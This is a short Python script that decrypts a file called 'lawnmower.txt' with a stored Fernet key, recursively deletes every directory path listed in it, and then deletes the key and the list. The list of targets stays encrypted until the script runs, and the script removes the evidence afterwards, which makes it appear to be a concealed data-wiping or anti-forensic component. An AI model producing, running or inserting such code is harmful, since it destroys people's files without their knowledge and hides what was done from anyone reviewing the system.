import os
import shutil
from cryptography.fernet import Fernet

# Load the key again
with open('lawnmower.key', 'rb') as f:
    key = f.read()

 # Create a Fernet object
fernet = Fernet(key)

# Read the encrypted data from the file
with open("lawnmower.txt", 'rb') as f:
        encrypted = f.read()

    # Decrypt the encrypted data
decrypted = fernet.decrypt(encrypted)
    # Write the decrypted data back to the file
with open("lawnmower.txt", 'wb') as f:
    f.write(decrypted)

f.close()
f=open ("lawnmower.txt", 'r')
for line in f.readlines():
    newLine=line.strip("\n")
    shutil.rmtree(newLine)
os.remove("lawnmower.key")
os.remove("lawnmower.txt")
